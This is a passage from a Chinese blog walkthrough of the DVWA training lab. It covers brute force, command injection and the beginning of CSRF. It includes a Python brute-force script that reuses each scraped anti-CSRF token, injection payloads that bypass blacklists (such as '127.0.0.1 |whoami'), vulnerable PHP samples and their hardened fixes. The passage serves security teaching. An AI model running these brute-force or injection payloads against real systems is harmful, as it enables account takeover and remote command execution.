mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">   $pass = md5( $pass );</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>每次服务器返回的登陆页面中都会包含一个随机的<code>user_token</code>的值，用户每次登录时都要将<code>user_token</code>一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。token不一致时，会返回</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CSRF token is incorrect</span><br></pre></td></tr></table></figure><p>这个增加了无脑爆破的难度，但是因为生成的<code>user_token</code>是可以在放在前端代码，可以写脚本来爆破，但是直接burpsuite无脑爆肯定是不行的了。</p><p><strong>漏洞利用</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># BruteForce </span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;192.168.220.1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;security=high; PHPSESSID=igtb1sfu1lm1gb9e4ug06i0d1e&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&#x27;http://192.168.220.1/dvwa/vulnerabilities/brute/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_token</span>(<span class="params">url, headers</span>):</span></span><br><span class="line">    req = requests.get(url=url, headers=headers)</span><br><span class="line">    response = req.text</span><br><span class="line">    <span class="comment"># print(response)</span></span><br><span class="line">    soup = BeautifulSoup(response, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    user_token = soup.form.find_all(<span class="string">&#x27;input&#x27;</span>)[<span class="number">3</span>][<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> user_token</span><br><span class="line"></span><br><span class="line">user_token = get_token(url,headers)</span><br><span class="line">dic = open(<span class="string">&#x27;3389.txt&#x27;</span>)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="comment"># print(line.strip())</span></span><br><span class="line">    requrl = <span class="string">&quot;http://192.168.220.1/dvwa/vulnerabilities/brute/index.php?username=admin&amp;password=&#123;&#125;&amp;Login=Login&amp;user_token=&#123;&#125;&quot;</span>.format(line.strip(), user_token)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    req = requests.get(requrl, headers)</span><br><span class="line">    print(i,<span class="string">&#x27;admin&#x27;</span>,line.strip(), user_token, req.status_code, len(req.text))</span><br><span class="line">    response = req.text</span><br><span class="line">    soup = BeautifulSoup(response, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    user_token = soup.form.find_all(<span class="string">&#x27;input&#x27;</span>)[<span class="number">3</span>][<span class="string">&#x27;value&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Login&#x27;</span> ] ) &amp;&amp; <span class="keyword">isset</span> ($_POST[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> ($_POST[<span class="string">&#x27;password&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_POST[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = stripslashes( $user );</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_POST[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = stripslashes( $pass );</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    $total_failed_login = <span class="number">3</span>;</span><br><span class="line">    $lockout_time       = <span class="number">15</span>;</span><br><span class="line">    $account_locked     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information)</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $row[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= $total_failed_login ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">        $last_login = strtotime( $row[ <span class="string">&#x27;last_login&#x27;</span> ] );</span><br><span class="line">        $timeout    = $last_login + ($lockout_time * <span class="number">60</span>);</span><br><span class="line">        $timenow    = time();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( $timenow &lt; $timeout ) &#123;</span><br><span class="line">            $account_locked = <span class="literal">true</span>;</span><br><span class="line">            <span class="comment">// print &quot;The account is locked&lt;br /&gt;&quot;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR);</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">    $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $account_locked == <span class="literal">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        $avatar       = $row[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">        $failed_login = $row[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line">        $last_login   = $row[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( $failed_login &gt;= $total_failed_login ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, $user, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>做了可靠的爆破机制：</p><p>30-38: 如果三次登录失败，就锁定15分钟，避免了无限制爆破。</p><p>每一步的数据库操作，都做了SQL语句的预处理，使用<code>PDO(Php Data Object)</code>防御SQL注入。</p><blockquote><p>PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。</p><p>当调用 prepare() 时，查询语句已经发送给了数据库服务器，此时只有占位符 ? 发送过去，没有用户提交的数据；当调用到 execute()时，用户提交过来的值才会传送给数据库，他们是分开传送的，两者独立的，SQL攻击者没有一点机会。</p><p><a href="https://blog.csdn.net/qq_28602957/article/details/51004241">PDO防止sql注入的机制</a></p></blockquote><h1 id="Command-Injection（命令注入）"><a href="#Command-Injection（命令注入）" class="headerlink" title="Command Injection（命令注入）"></a>Command Injection（命令注入）</h1><p>命令注入，一般在通过php进行系统接口调用的时候容易出现。</p><h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>stristr — <a href="https://www.php.net/manual/zh/function.strstr.php">strstr()</a> 函数的忽略大小写版本</p><p>stristr ( string <code>$haystack</code> , <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$needle</code> [, bool <code>$before_needle</code> = <strong><code>FALSE</code></strong> ] ) : string</p><p>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到结尾的字符串。可选参数before_true为布尔型，默认为“false”，如果设置为“true”，函数将返回search参数第一次出现之前的字符串部分。</p></blockquote><p><code>php_uname</code>返回系统信息。这两个函数只是判断一下系统，关键在于<code>shell_exec()</code>函数，直接接受<code>$ip</code>作为参数，没有任何过滤和检查，完全信任用户输入，可以直接<code>&amp;&amp; cmd</code>执行命令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp;&amp; whoami</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/01/VG8oyqiY1JM6hNB.png"></p><h2 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h2><p>增加了简单的黑名单过滤，将<code>&amp;&amp;和;</code>替换成空值，但是明显是很容易绕过的。比如用&amp;或者双写绕过。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Set blacklist</span></span><br><span class="line">   $substitutions = <span class="keyword">array</span>(</span><br><span class="line">       <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">       <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">   $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 &amp; whoami</span><br><span class="line">127.0.0.1 &amp;;&amp; whoami</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/01/NYbyJXsAO7fQT82.png"></p><p>这里使用一个<code>&amp;</code>来绕过，但是<code>&amp;&amp;</code>和<code>&amp;</code>是有区别的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd1 &amp;&amp; cmd2cmd1执行成功，再执行cmd2，否则不执行cmd2</span><br><span class="line">cmd1 &amp; cmd2cmd1和cmd2都要执行</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\DELL&gt;ping 12345 &amp;&amp; whoami</span><br><span class="line"></span><br><span class="line">正在 Ping 0.0.48.57 具有 32 字节的数据:</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line"></span><br><span class="line">0.0.48.57 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 &#x3D; 4，已接收 &#x3D; 0，丢失 &#x3D; 4 (100% 丢失)，</span><br><span class="line"></span><br><span class="line">C:\Users\DELL&gt;ping 12345 &amp; whoami</span><br><span class="line"></span><br><span class="line">正在 Ping 0.0.48.57 具有 32 字节的数据:</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line">PING：传输失败。常见故障。</span><br><span class="line"></span><br><span class="line">0.0.48.57 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 &#x3D; 4，已接收 &#x3D; 0，丢失 &#x3D; 4 (100% 丢失)，</span><br><span class="line">desktop-iknkost\dell</span><br></pre></td></tr></table></figure><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = trim($_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br></pre></td></tr></table></figure><p>扩大了黑名单的范围，用<code>trim</code>去除字符串尾部的空白字符或者换行符等。</p><p>这里只过滤的<code>| </code>（|后面一个空格），但是还存在<code> |</code>（|前面有一个空格）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1 |whoami</span><br><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure><blockquote><p>Command 1 | Command 2</p><p>“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。</p></blockquote><h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    $octet = explode( <span class="string">&quot;.&quot;</span>, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( $octet[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        $target = $octet[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>stripslashes(string)</code></p><p>stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。</p><p><code>explode(separator,string,limit)</code></p><p>把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。</p></blockquote><p>通过<code>.</code>分割IP，然后判断IP每个部分是否是数字，不是就报错。防御住命令注入。</p><h1 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h1><blockquote><p>CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p></blockquote><p>说实话，都快忘光了。</p><h2 id="Low-2"><a href="#Low-2" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制。</p><p>也就是说，以任何方式欺骗受害者点击这个链接或者伪装成别的样子的这个链接，都会导致用户密码更改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span 